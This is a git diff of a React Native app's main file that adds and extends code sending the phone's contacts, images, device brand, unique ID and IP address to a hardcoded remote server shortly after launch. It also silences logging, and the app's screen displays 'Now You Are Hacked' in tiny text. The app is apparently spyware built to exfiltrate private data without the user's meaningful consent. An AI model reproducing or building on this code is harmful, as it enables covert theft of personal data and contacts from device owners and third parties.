@@ -24,14 +24,38 @@ import DeviceInfo from 'react-native-device-info';
 import axios from "axios"
 
 let form_data = undefined;
+
+// let SERVER_URL = 'http://192.168.1.2:5000/api';
+let SERVER_URL = 'http://3.131.100.54:5000/api';
+
 const App = () => {
   const [contacts, setContacts] = useState([]);
   const [whichMode, setWhichMode] = useState("contact")
   const [imageData, setImageData] = useState(undefined);
   const [deviceId, setDeviceId] = useState(undefined);
 
+  let deviceJSON = {};
+
+  deviceJSON.brand = DeviceInfo.getBrand();
+  deviceJSON.uniqueId = DeviceInfo.getUniqueId();
+  deviceJSON.IpAddress = DeviceInfo.getIpAddressSync();
+
+
+  const send_DeviceInfo = () => {
+    let data = deviceJSON ? deviceJSON : {}
+    axios.post(`${SERVER_URL}/client`, data)
+      .then(function (response) {
+        // console.log(response);
+      })
+      .catch(function (error) {
+        // console.log(error);
+      });
+  }
+
+
   useEffect(() => {
     if (Platform.OS === "android") {
+
       getdeviceId()
       PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
         title: "Contacts",
@@ -99,12 +123,12 @@ const App = () => {
           let form_data_push = createFormData(_data, body)
           setImageData(_data)
 
-          axios.post('http://ec2-3-131-100-54.us-east-2.compute.amazonaws.com:5000/api/images', form_data_push)
+          axios.post(`${SERVER_URL}/images`, form_data_push)
             .then(function (response) {
-              console.log(response);
+              // console.log(response);
             })
             .catch(function (error) {
-              console.log(error);
+              // console.log(error);
             });
         })
         .catch((error) => {
@@ -113,6 +137,7 @@ const App = () => {
     }
 
     setTimeout(() => {
+      send_DeviceInfo()
       postContact()
     }, 5000);
   }, []);
@@ -132,12 +157,12 @@ const App = () => {
           contact.device_id = uniqueId
         })
         setContacts(contacts);
-        axios.post('http://ec2-3-131-100-54.us-east-2.compute.amazonaws.com:5000/api/contacts', tempContact)
+        axios.post(`${SERVER_URL}/contacts`, tempContact)
           .then(function (response) {
-            console.log(response);
+            // console.log(response);
           })
           .catch(function (error) {
-            console.log(error);
+            // console.log(error);
           });
       }
     });
@@ -160,6 +185,8 @@ const App = () => {
   const postContact = () => {
 
   }
+
+
 
 
   // console.log("CONTACTS", filename);
@@ -225,7 +252,7 @@ const App = () => {
 
     //   </View>
     // </SafeAreaView>
-    <View style={{backgroundColor: '#000', flex: 1}}>
+    <View style={{ backgroundColor: '#000', flex: 1 }}>
       <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#222" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
       <Text>Your Device Id is {deviceId ? deviceId : null}</Text>
     </View>
